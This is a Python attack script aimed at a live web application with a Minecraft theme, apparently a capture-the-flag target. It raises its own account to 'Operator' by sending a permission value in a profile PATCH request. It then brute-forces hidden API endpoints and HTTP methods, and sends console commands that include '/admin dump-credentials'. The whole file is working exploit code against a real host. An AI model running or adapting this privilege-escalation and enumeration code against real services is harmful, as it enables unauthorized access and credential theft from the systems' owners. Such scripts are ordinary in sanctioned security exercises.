#!/usr/bin/env python3
import requests, json, base64

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)
s.patch(BASE + '/api/v2/player/profile', json={'permission': 3},
        headers={'Accept': 'application/json'}, timeout=15)
print('Elevated to Operator')

def req(method, path, **kw):
    r = getattr(s, method)(BASE + path, timeout=15, **kw)
    try:
        return r.status_code, r.json()
    except:
        return r.status_code, r.text[:500]

# The nether chunk scan returned the fortress. Maybe we need to mark it as "surveyed".
# Try POST to the nether chunk endpoint
print('\n[A] POST nether chunk (survey):')
code, data = req('post', '/api/nether/chunk/1340/-255', json={})
print(code, json.dumps(data)[:400] if isinstance(data, dict) else data)

# Try the world resource API (from world.js: /api/world/resource/)
print('\n[B] world/resource endpoints:')
for res_id in ['fortress_84', 'Chunk_0x84', 'loot_table', 'enchanted_book', '1340_-255', 'surveyed']:
    code, data = req('get', f'/api/world/resource/{res_id}')
    if code != 404:
        print(f'  /api/world/resource/{res_id} [{code}]: {json.dumps(data)[:300] if isinstance(data,dict) else data}')

# Try PUT/PATCH nether chunk to mark as surveyed
print('\n[C] PATCH/PUT nether chunk:')
for method in ['patch', 'put']:
    code, data = req(method, '/api/nether/chunk/1340/-255', json={'surveyed': True, 'status': 'surveyed'})
    print(f'  {method.upper()} [{code}]: {json.dumps(data)[:300] if isinstance(data,dict) else data}')

# Try the loot endpoint with different methods
print('\n[D] loot/fortress_84 variants:')
for method in ['get', 'post', 'put', 'patch']:
    for path in ['/loot/fortress_84', '/api/loot/fortress_84', '/api/nether/loot/fortress_84']:
        code, data = req(method, path)
        if code != 404:
            print(f'  {method.upper()} {path} [{code}]: {json.dumps(data)[:300] if isinstance(data,dict) else data}')

# Try operator console endpoint (from world.js: /api/operator/console)
print('\n[E] operator console:')
for cmd in ['/op Steve', '/locate fortress', '/survey chunk 1340 -255', 
            'survey 1340 -255', '/chunk survey 1340 -255',
            '/loot fortress_84', '/admin dump-credentials']:
    code, data = req('post', '/api/operator/console', json={'command': cmd})
    print(f'  cmd={cmd!r} [{code}]: {json.dumps(data)[:300] if isinstance(data,dict) else data}')

# operator fragments
print('\n[F] API exploration:')
for path in ['/api/operator/', '/api/operator/survey', '/api/nether/survey/1340/-255',
             '/api/operator/chunks', '/api/operator/loot']:
    code, data = req('get', path)
    if code != 404:
        print(f'  GET {path} [{code}]: {json.dumps(data)[:300] if isinstance(data,dict) else data}')
